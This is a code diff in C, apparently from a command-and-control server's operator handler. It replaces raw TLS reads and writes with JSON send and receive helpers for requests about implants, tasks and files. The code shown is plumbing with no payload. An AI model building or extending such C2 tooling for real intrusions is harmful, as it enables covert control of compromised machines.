@@ -230,16 +230,17 @@ void *operator_handler(void *Args) {
     // operator requesting infomartion or add new tasks
     START:
     while (1) {
-        char buffer[1024];
-        memset(buffer, 0, sizeof(buffer));
-        int bytes_received = SSL_read(ssl, buffer, sizeof(buffer) - 1); // recv(sock, buffer, sizeof(buffer), 0);
-        if (bytes_received <= 0) {
-            //perror("recv failed");
-            log_message(LOG_ERROR, "Failed to receive data from operator");
-            return NULL;
-        }
+        //char buffer[1024];
+        //memset(buffer, 0, sizeof(buffer));
+        //int bytes_received = SSL_read(ssl, buffer, sizeof(buffer) - 1); // recv(sock, buffer, sizeof(buffer), 0);
+        //if (bytes_received <= 0) {
+        //    //perror("recv failed");
+        //    log_message(LOG_ERROR, "Failed to receive data from operator");
+        //    return NULL;
+        //}
+        char *buffer = recv_json(ssl);
 
-        buffer[bytes_received] = '\0'; 
+        //buffer[bytes_received] = '\0'; 
         cJSON *requested_info = cJSON_Parse(buffer);
         if (requested_info == NULL) {
             //fprintf(stderr, "Failed to parse JSON: %s\n", buffer);
@@ -267,14 +268,16 @@ void *operator_handler(void *Args) {
             if (!re) {
                 log_message(LOG_ERROR, "Invalid JSON FROM Implants database");
             }
-            SSL_write(ssl, implants, strlen(implants));
+            //SSL_write(ssl, implants, strlen(implants));
+            send_json(ssl, implants);
             free(implants);
         } else if (strcmp(about->valuestring, "Tasks") == 0) {
             char *tasks = GetData(con, "Tasks");
             if (tasks == NULL) {
                 continue;
             }
-            SSL_write(ssl, tasks, strlen(tasks));
+            //SSL_write(ssl, tasks, strlen(tasks));
+            send_json(ssl, tasks);
             free(tasks);
         } else if (strcmp(about->valuestring, "implant_id") == 0) {
             char *data = interact_with_implant(con, requested_info);
@@ -284,7 +287,8 @@ void *operator_handler(void *Args) {
                 continue;
             }
             //send(sock, data, strlen(data), 0);
-            SSL_write(ssl, data, strlen(data));
+            //SSL_write(ssl, data, strlen(data));
+            send_json(ssl, data);
             free(data);
         } else if (strncmp(about->valuestring, "exit", 4) == 0 ) {
             log_message(LOG_INFO, "Operator [%s] Exiting", USERNAME);
@@ -297,7 +301,8 @@ void *operator_handler(void *Args) {
                 log_message(LOG_WARN, "IS vallid is null");
                 continue;
             }            
-            SSL_write(ssl, is_valid, strlen(is_valid));
+            //SSL_write(ssl, is_valid, strlen(is_valid));
+            send_json(ssl, is_valid);
             free(is_valid);
         } else if (strcmp(about->valuestring, "files") == 0) {
             cJSON *option = cJSON_GetObjectItem(requested_info, "option");
